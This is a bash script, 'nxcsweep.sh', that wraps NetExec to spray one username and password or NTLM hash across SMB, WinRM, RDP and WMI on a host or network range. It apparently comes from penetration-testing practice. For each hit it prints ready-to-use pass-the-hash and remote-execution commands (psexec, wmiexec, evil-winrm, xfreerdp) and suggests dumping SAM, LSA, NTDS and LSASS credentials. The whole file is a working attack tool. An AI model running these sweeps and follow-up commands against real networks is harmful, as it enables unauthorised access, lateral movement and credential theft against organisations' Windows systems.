#!/bin/bash
#
# nxcsweep.sh
# Validates a given username/password (or username/NTLM hash) against
# SMB, WinRM, RDP, and WMI on a single IP or a full network range using
# NetExec (nxc).
#
# Usage (matches nxc's own flag style):
#   ./nxcsweep.sh <target> -u <username> -p <password>
#   ./nxcsweep.sh <target> -u <username> -H <ntlm_hash>
#
# Examples:
#   ./nxcsweep.sh 10.10.10.5 -u administrator -p 'P@ssw0rd!'
#   ./nxcsweep.sh 10.10.10.0/24 -u j.doe -p 'Summer2024!'
#   ./nxcsweep.sh 10.10.10.5 -u administrator -H <hash>
#
# Requires: netexec (nxc) - https://github.com/Pennyw0rth/NetExec

set -euo pipefail

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GREY='\033[0;37m'
NC='\033[0m'

usage() {
    echo -e "${YELLOW}Usage:${NC} $0 <target_ip_or_cidr> -u <username> -p <password>"
    echo -e "       $0 <target_ip_or_cidr> -u <username> -H <ntlm_hash>"
    echo -e ""
    echo -e "  e.g. $0 10.10.10.0/24 -u administrator -p 'Password123!'"
    echo -e "  e.g. $0 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
    exit 1
}

if [ "$#" -lt 5 ]; then
    usage
fi

TARGET="$1"
shift

USERNAME=""
SECRET=""
MODE=""

while getopts ":u:p:H:" opt; do
    case "$opt" in
        u) USERNAME="$OPTARG" ;;
        p) SECRET="$OPTARG"; MODE="password" ;;
        H) SECRET="$OPTARG"; MODE="hash" ;;
        *) usage ;;
    esac
done

if [ -z "$USERNAME" ] || [ -z "$SECRET" ] || [ -z "$MODE" ]; then
    usage
fi

if ! command -v nxc &> /dev/null; then
    echo -e "${RED}[!] netexec (nxc) not found in PATH. Install it first: pip install netexec${NC}"
    exit 1
fi

PROTOCOLS=("smb" "winrm" "rdp" "wmi")

echo -e "${CYAN}=========================================${NC}"
echo -e "${CYAN} nxcsweep - Protocol Credential Validator${NC}"
echo -e "${CYAN}=========================================${NC}"
echo -e "Target   : ${YELLOW}${TARGET}${NC}"
echo -e "Username : ${YELLOW}${USERNAME}${NC}"
if [ "$MODE" = "hash" ]; then
    echo -e "NTLM Hash: ${YELLOW}${SECRET}${NC}"
else
    echo -e "Password : ${YELLOW}${SECRET}${NC}"
fi
echo ""

# deduplicated hit tracking: key = "proto|ip", value = "yes"/"no" (Pwn3d status)
# HIT_ORDER preserves first-seen order so output stays grouped sensibly
declare -A HITMAP=()
declare -a HIT_ORDER=()

for proto in "${PROTOCOLS[@]}"; do
    echo -e "${CYAN}[*] Checking protocol: ${proto^^}${NC}"

    # Run nxc through a pseudo-tty (via `script`) so it emits its own native
    # multi-color output instead of stripping colors because it's not attached
    # to a real terminal when captured into a variable.
    esc_target=$(printf '%q' "$TARGET")
    esc_user=$(printf '%q' "$USERNAME")
    esc_secret=$(printf '%q' "$SECRET")
    if [ "$MODE" = "hash" ]; then
        NXC_CMD="nxc $proto $esc_target -u $esc_user -H $esc_secret"
    else
        NXC_CMD="nxc $proto $esc_target -u $esc_user -p $esc_secret"
    fi

    if command -v script &> /dev/null; then
        OUTPUT=$(script -qec "$NXC_CMD" /dev/null 2>&1 || true)
    else
        if [ "$MODE" = "hash" ]; then
            OUTPUT=$(nxc "$proto" "$TARGET" -u "$USERNAME" -H "$SECRET" 2>&1 || true)
        else
            OUTPUT=$(nxc "$proto" "$TARGET" -u "$USERNAME" -p "$SECRET" 2>&1 || true)
        fi
    fi


    PLAIN=$(echo "$OUTPUT" | sed -r 's/\x1b\[[0-9;]*[a-zA-Z]//g')


    if echo "$PLAIN" | grep -qi "(Pwn3d!)"; then
        echo -e "${GREEN}[+] $proto: Admin access confirmed (Pwn3d!)${NC}"
    elif echo "$PLAIN" | grep -qi "\[+\]"; then
        echo -e "${GREEN}[+] $proto: Valid credentials${NC}"
    elif echo "$PLAIN" | grep -qi "\[-\]"; then
        echo -e "${RED}[-] $proto: Failed / invalid credentials${NC}"
    else
        echo -e "${YELLOW}[?] $proto: No response / host(s) unreachable on this protocol${NC}"
    fi

    echo "$OUTPUT" | sed 's/^/    /'
    echo ""

    while IFS= read -r line; do
        [ -z "$line" ] && continue
        ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1 || true)
        [ -z "$ip" ] && continue
        key="${proto}|${ip}"
        if echo "$line" | grep -qi "(Pwn3d!)"; then
            pwn="yes"
        else
            pwn="no"
        fi
        if [ -z "${HITMAP[$key]:-}" ]; then
            HITMAP["$key"]="$pwn"
            HIT_ORDER+=("$key")
        elif [ "$pwn" = "yes" ]; then
            HITMAP["$key"]="yes"
        fi
    done < <(echo "$PLAIN" | grep -i "\[+\]")
done

if [ "${#HIT_ORDER[@]}" -gt 0 ]; then
    echo ""
    echo -e "${CYAN}=========================================${NC}"
    echo -e "${CYAN} Valid credential hits - connect commands${NC}"
    echo -e "${CYAN}=========================================${NC}"

    for key in "${HIT_ORDER[@]}"; do
        IFS='|' read -r hproto hip <<< "$key"
        hpwn="${HITMAP[$key]}"
        case "$hproto" in
            winrm)
                if [ "$hpwn" = "yes" ]; then
                    echo -e "${GREEN}[+] WinRM (Pwn3d!) on ${hip}${NC}"
                else
                    echo -e "${GREEN}[+] WinRM valid on ${hip}${NC}"
                fi
                if [ "$MODE" = "hash" ]; then
                    echo -e "    ${GREY}evil-winrm -i ${hip} -u '${USERNAME}' -H '${SECRET}'${NC}"
                else
                    echo -e "    ${GREY}evil-winrm -i ${hip} -u '${USERNAME}' -p '${SECRET}'${NC}"
                fi
                ;;
            smb)
                if [ "$hpwn" = "yes" ]; then
                    echo -e "${GREEN}[+] SMB admin (Pwn3d!) on ${hip}${NC}"
                    if [ "$MODE" = "hash" ]; then
                        echo -e "    ${GREY}impacket-psexec -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
                        echo -e "    ${GREY}impacket-wmiexec -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -H '${SECRET}' -x whoami${NC}"
                    else
                        echo -e "    ${GREY}impacket-psexec '${USERNAME}:${SECRET}@${hip}'${NC}"
                        echo -e "    ${GREY}impacket-wmiexec '${USERNAME}:${SECRET}@${hip}'${NC}"
                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -p '${SECRET}' -x whoami${NC}"
                    fi
                    echo ""
                    echo -e "    ${CYAN}You can dump credentials as well using nxc modules (--sam, --lsa, --ntds, -M lsassy, -M dpapi)${NC}"
                else
                    echo -e "${GREEN}[+] SMB valid (non-admin) on ${hip}${NC}"
                    if [ "$MODE" = "hash" ]; then
                        # standard smbclient can't pass-the-hash; impacket's smbclient.py can
                        echo -e "    ${GREY}impacket-smbclient -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -H '${SECRET}' --shares${NC}"
                    else
                        echo -e "    ${GREY}smbclient -L //${hip}/ -U '${USERNAME}%${SECRET}'${NC}"
                        echo -e "    ${GREY}nxc smb ${hip} -u '${USERNAME}' -p '${SECRET}' --shares${NC}"
                    fi
                fi
                ;;
            rdp)
                echo -e "${GREEN}[+] RDP valid on ${hip}${NC}"
                if [ "$MODE" = "hash" ]; then
                    echo -e "    ${GREY}xfreerdp3 /v:${hip} /u:${USERNAME} /pth:${SECRET} +dynamic-resolution /drive:privtools,/home/offo/windowspriv/tools${NC}"
                else
                    echo -e "    ${GREY}xfreerdp3 /v:${hip} /u:${USERNAME} /p:'${SECRET}' +dynamic-resolution /drive:privtools,/home/offo/windowspriv/tools${NC}"
                fi
                ;;
            wmi)
                echo -e "${GREEN}[+] WMI valid on ${hip}${NC}"
                if [ "$MODE" = "hash" ]; then
                    echo -e "    ${GREY}impacket-wmiexec -hashes ':${SECRET}' '${USERNAME}@${hip}'${NC}"
                else
                    echo -e "    ${GREY}impacket-wmiexec '${USERNAME}:${SECRET}@${hip}'${NC}"
                fi
                ;;
        esac
        echo ""
    done
else
    echo ""
    echo -e "${YELLOW}[!] No valid credential hits across any protocol.${NC}"
fi
